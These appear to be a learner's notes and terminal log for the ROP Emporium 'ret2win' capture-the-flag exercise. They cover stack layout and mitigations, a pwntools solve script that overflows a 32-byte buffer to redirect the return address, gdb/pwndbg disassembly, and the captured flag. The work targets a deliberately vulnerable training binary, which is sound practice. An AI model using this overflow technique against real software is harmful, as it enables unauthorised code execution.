pwn checksec 

RELRO
Stack
NX 
PIE = position independent executable

binary ninja
> opened binary
not enough allocation for data needed -> buffer overflow

crash 
debugger

$rsp stack pointer
x/s $rsp 

$rbp base pointer 

msf something (dabrooen?) pattern

pwntools cyclic

first four letters of the stack 

32 + 8 to take over return pointer 

point to function ret2win 

symbol table 
resolve location of functions 

manipulate our pointer 

treat it as a variable type 

little endian - reads 8 bytes in reverse 

take input of more than reserved and 

first 32 = reserved 
next 8 = base pointer = first bytes at the base of the stack
next 8 = overwrite the return address  

return 2 win vs canaries

stack cookie or stack canary 
random set of 8 bytes that needs to match an exact value or error
-----
from pwn import *

e = ELF('./ret2win')

win_addr = e.sym['ret2win']
junk = b"A"*40

#print("Ret2Win is at" ,hex(win_addr))

p = process('./ret2win')
p.sendline(junk + p64(win_addr))
p.interactive()
----
----
{10:51}~/workspace/rop_emporium_all_challenges/folder_ret2win ➭ ls
core  flag.txt  quick_jots.txt  ret2win  solve-ret2win.py
{10:51}~/workspace/rop_emporium_all_challenges/folder_ret2win ➭ gdb ret2win
GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 188 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ret2win...
(No debugging symbols found in ret2win)
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0000000000400697 <+0>:     push   rbp
   0x0000000000400698 <+1>:     mov    rbp,rsp
   0x000000000040069b <+4>:     mov    rax,QWORD PTR [rip+0x2009b6]        # 0x601058 <stdout@@GLIBC_2.2.5>
   0x00000000004006a2 <+11>:    mov    ecx,0x0
   0x00000000004006a7 <+16>:    mov    edx,0x2
   0x00000000004006ac <+21>:    mov    esi,0x0
   0x00000000004006b1 <+26>:    mov    rdi,rax
   0x00000000004006b4 <+29>:    call   0x4005a0 <setvbuf@plt>
   0x00000000004006b9 <+34>:    mov    edi,0x400808
   0x00000000004006be <+39>:    call   0x400550 <puts@plt>
   0x00000000004006c3 <+44>:    mov    edi,0x400820
   0x00000000004006c8 <+49>:    call   0x400550 <puts@plt>
   0x00000000004006cd <+54>:    mov    eax,0x0
   0x00000000004006d2 <+59>:    call   0x4006e8 <pwnme>
   0x00000000004006d7 <+64>:    mov    edi,0x400828
   0x00000000004006dc <+69>:    call   0x400550 <puts@plt>
   0x00000000004006e1 <+74>:    mov    eax,0x0
   0x00000000004006e6 <+79>:    pop    rbp
   0x00000000004006e7 <+80>:    ret
End of assembler dump.
pwndbg> disassemble pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:     push   rbp
   0x00000000004006e9 <+1>:     mov    rbp,rsp
   0x00000000004006ec <+4>:     sub    rsp,0x20
   0x00000000004006f0 <+8>:     lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:    mov    edx,0x20
   0x00000000004006f9 <+17>:    mov    esi,0x0
   0x00000000004006fe <+22>:    mov    rdi,rax
   0x0000000000400701 <+25>:    call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:    mov    edi,0x400838
   0x000000000040070b <+35>:    call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:    mov    edi,0x400898
   0x0000000000400715 <+45>:    call   0x400550 <puts@plt>
   0x000000000040071a <+50>:    mov    edi,0x4008b8
   0x000000000040071f <+55>:    call   0x400550 <puts@plt>
   0x0000000000400724 <+60>:    mov    edi,0x400918
   0x0000000000400729 <+65>:    mov    eax,0x0
   0x000000000040072e <+70>:    call   0x400570 <printf@plt>
   0x0000000000400733 <+75>:    lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:    mov    edx,0x38
   0x000000000040073c <+84>:    mov    rsi,rax
   0x000000000040073f <+87>:    mov    edi,0x0
   0x0000000000400744 <+92>:    call   0x400590 <read@plt>
   0x0000000000400749 <+97>:    mov    edi,0x40091b
   0x000000000040074e <+102>:   call   0x400550 <puts@plt>
   0x0000000000400753 <+107>:   nop
   0x0000000000400754 <+108>:   leave
   0x0000000000400755 <+109>:   ret
End of assembler dump.
pwndbg> break *0x0000000000400755
Breakpoint 1 at 0x400755
pwndbg> run
Starting program: /root/workspace/rop_emporium_all_challenges/folder_ret2win/ret2win
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
Thank you!

Breakpoint 1, 0x0000000000400755 in pwnme ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────
 RAX  0xb
 RBX  0x400780 (__libc_csu_init) ◂— push   r15
 RCX  0x7ffff7edfd53 (write+19) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x0
 RDI  0x7ffff7fb2670 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x7ffff7fb0743 (_IO_2_1_stdout_+131) ◂— 0xfb2670000000000a /* '\n' */
 R8   0xb
 R9   0x7ffff7fdc1f0 (_dl_fini) ◂— push   rbp
 R10  0xfffffffffffffb87
 R11  0x246
 R12  0x4005b0 (_start) ◂— xor    ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x4242424242424242 ('BBBBBBBB')
 RSP  0x7fffffffe4e8 ◂— 'CCCCCCCC\n'
 RIP  0x400755 (pwnme+109) ◂— ret
────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────
 ► 0x400755 <pwnme+109>    ret    <0x4343434343434343>










─────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe4e8 ◂— 'CCCCCCCC\n'
01:0008│     0x7fffffffe4f0 ◂— 0xa /* '\n' */
02:0010│     0x7fffffffe4f8 —▸ 0x7ffff7e197ed (__libc_start_main+205) ◂— mov    edi, eax
03:0018│     0x7fffffffe500 —▸ 0x7fffffffe5e8 —▸ 0x7fffffffe802 ◂— '/root/workspace/rop_emporium_all_challenges/folder_ret2win/ret2win'
04:0020│     0x7fffffffe508 ◂— 0x1f7fcb000
05:0028│     0x7fffffffe510 —▸ 0x400697 (main) ◂— push   rbp
06:0030│     0x7fffffffe518 —▸ 0x7fffffffe7e9 ◂— 0x9ca923a9b625d69e
07:0038│     0x7fffffffe520 —▸ 0x400780 (__libc_csu_init) ◂— push   r15
───────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────
 ► f 0         0x400755 pwnme+109
   f 1 0x4343434343434343
   f 2              0xa
   f 3   0x7ffff7e197ed __libc_start_main+205
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> quit
{10:59}~/workspace/rop_emporium_all_challenges/folder_ret2win ➭ python3
Python 3.9.9 (main, Jan 10 2022, 10:55:59)
[GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> e = ELF('./ret2win')
[*] '/root/workspace/rop_emporium_all_challenges/folder_ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
>>> print (hex(e.sym['ret2win']))
0x400756
>>>
{11:03}~/workspace/rop_emporium_all_challenges/folder_ret2win ➭ gdb ./ret2win
GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 188 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./ret2win...
(No debugging symbols found in ./ret2win)
pwndbg> disassemble ret2win
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:     push   rbp
   0x0000000000400757 <+1>:     mov    rbp,rsp
   0x000000000040075a <+4>:     mov    edi,0x400926
   0x000000000040075f <+9>:     call   0x400550 <puts@plt>
   0x0000000000400764 <+14>:    mov    edi,0x400943
   0x0000000000400769 <+19>:    call   0x400560 <system@plt>
   0x000000000040076e <+24>:    nop
   0x000000000040076f <+25>:    pop    rbp
   0x0000000000400770 <+26>:    ret
End of assembler dump.
pwndbg> x/s 0x400943
0x400943:       "/bin/cat flag.txt"
pwndbg> quit
{11:07}~/workspace/rop_emporium_all_challenges/folder_ret2win ➭ cat solve-ret2win.py
from pwn import *

e = ELF('./ret2win')

win_addr = e.sym['ret2win']
junk = b"A"*40

#print("Ret2Win is at" ,hex(win_addr))

p = process('./ret2win')
p.sendline(junk + p64(win_addr))
p.interactive()
{11:07}~/workspace/rop_emporium_all_challenges/folder_ret2win ➭ python3 solve-ret2win.py
[*] '/root/workspace/rop_emporium_all_challenges/folder_ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './ret2win': pid 222
[*] Switching to interactive mode
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}